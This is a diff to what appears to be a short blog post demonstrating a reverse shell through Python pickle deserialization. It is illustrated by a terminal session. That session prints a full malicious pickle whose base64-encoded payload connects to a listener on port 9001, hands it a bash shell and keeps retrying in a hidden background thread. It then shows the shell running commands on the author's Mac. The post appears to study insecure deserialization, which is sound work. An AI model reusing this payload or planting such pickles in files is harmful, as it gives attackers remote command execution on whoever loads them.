@@ -5,7 +5,22 @@ tags: python, pickle, reverse-shell
 
 Reverse shell with pickle.
 
-![rshell test](/img/Screenshot%202025-07-29%20at%2001.55.02.png)
+```shell
+aleksandrvin@Mac python-playground % uv run python pickle_rshell.py --selfcheck
+b'c__builtin__\nexec\n(Vimport base64\ntRc__builtin__\neval\n(Vexec(base64.b64decode("IiIiClJlbW90ZSBzaGVsbAoKT3B0aW9uYWxseSBibG9ja3MgdGhlIGV4ZWN1dGlvbgoiIiIKaW1wb3J0IGFzeW5jaW8KCkhPU1QgPSAnMTI3LjAuMC4xJwpQT1JUID0gOTAwMQoKYXN5bmMgZGVmIGZvcndhcmRfb3V0cHV0KHByb2MsIHdyaXRlcik6CiAgICBhc3luYyBmb3IgbGluZSBpbiBwcm9jLnN0ZG91dDoKICAgICAgICB3cml0ZXIud3JpdGUobGluZSkKICAgICAgICBhd2FpdCB3cml0ZXIuZHJhaW4oKQogICAgd3JpdGVyLmNsb3NlKCkKICAgIGF3YWl0IHdyaXRlci53YWl0X2Nsb3NlZCgpCgphc3luYyBkZWYgZm9yd2FyZF9pbnB1dChyZWFkZXIsIHByb2MpOgogICAgdHJ5OgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIGRhdGEgPSBhd2FpdCByZWFkZXIucmVhZCgxMDI0KQogICAgICAgICAgICBpZiBub3QgZGF0YToKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIHByb2Muc3RkaW4ud3JpdGUoZGF0YSkKICAgICAgICAgICAgYXdhaXQgcHJvYy5zdGRpbi5kcmFpbigpCiAgICAgICAgcHJvYy5zdGRpbi5jbG9zZSgpCiAgICAgICAgYXdhaXQgcHJvYy5zdGRpbi53YWl0X2Nsb3NlZCgpCiAgICBleGNlcHQgYXN5bmNpby5DYW5jZWxsZWRFcnJvcjoKICAgICAgICBwYXNzCgphc3luYyBkZWYgbWFpbigpOgogICAgcmVhZGVyLCB3cml0ZXIgPSBhd2FpdCBhc3luY2lvLm9wZW5fY29ubmVjdGlvbihIT1NULCBQT1JUKQogICAgcHJvYyA9IGF3YWl0IGFzeW5jaW8uY3JlYXRlX3N1YnByb2Nlc3NfZXhlYygKICAgICAgICAnYmFzaCcsCiAgICAgICAgc3RkaW49YXN5bmNpby5zdWJwcm9jZXNzLlBJUEUsCiAgICAgICAgc3Rkb3V0PWFzeW5jaW8uc3VicHJvY2Vzcy5QSVBFLAogICAgICAgIHN0ZGVycj1hc3luY2lvLnN1YnByb2Nlc3MuU1RET1VULAogICAgKQogICAgYXdhaXQgYXN5bmNpby5nYXRoZXIoCiAgICAgICAgZm9yd2FyZF9vdXRwdXQocHJvYywgd3JpdGVyKSwKICAgICAgICBmb3J3YXJkX2lucHV0KHJlYWRlciwgcHJvYyksCiAgICApCiAgICBhd2FpdCBwcm9jLndhaXQoKQoKCkJMT0NLX0VYRUMgPSBGYWxzZQoKaWYgQkxPQ0tfRVhFQzoKICBhc3luY2lvLnJ1bihtYWluKCkpCmVsc2U6CiAgIyBSdW5uaW5nIGluIGEgdGhyZWFkCgogIGRlZiBzdGFydF9iYWNrZ3JvdW5kX2xvb3AoKToKICAgIHdoaWxlIFRydWU6CiAgICAgICMgcHJpbnQoIkNyZWF0aW5nIGEgcnNoZWxsLi4uIikKICAgICAgdHJ5OgogICAgICAgIGFzeW5jaW8ucnVuKG1haW4oKSkKICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwYXNzCiAgICAgICMgcHJpbnQoIkF3YWl0aW5nLi4uIikKICAgICAgYXN5bmNpby5ydW4oYXN5bmNpby5zbGVlcCgyKSkKCiAgaW1wb3J0IHRocmVhZGluZwoKICB0aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1zdGFydF9iYWNrZ3JvdW5kX2xvb3AsIGRhZW1vbj1UcnVlKQogIHRocmVhZC5zdGFydCgpCg==").decode())\ntR.'
+Loading pickle...
+Loaded pickle (NOT BLOCKED)...
+Connected from ('127.0.0.1', 53272)
+>>> uname -a
+>>> w
+>>> exit
+Darwin Mac.home 24.5.0 Darwin Kernel Version 24.5.0: Tue Apr 22 19:54:26 PDT 2025; root:xnu-11417.121.6~2/RELEASE_ARM64_T8112 arm64
+ 1:46  up 23 days, 22:52, 2 users, load averages: 1.74 1.78 1.78
+USER       TTY      FROM    LOGIN@  IDLE WHAT
+aleksandrv console  -      05Jul25 23days -
+aleksandrv s006     -      Mon23       - w
+aleksandrvin@Mac python-playground %
+```
 
 See [pickle_rshell.py](/scripts/pickle_rshell.py) and [rshell.py](/scripts/rshell.py)
 and [DANGEROUS PICKLES — MALICIOUS PYTHON SERIALIZATION](https://intoli.com/blog/dangerous-pickles/).
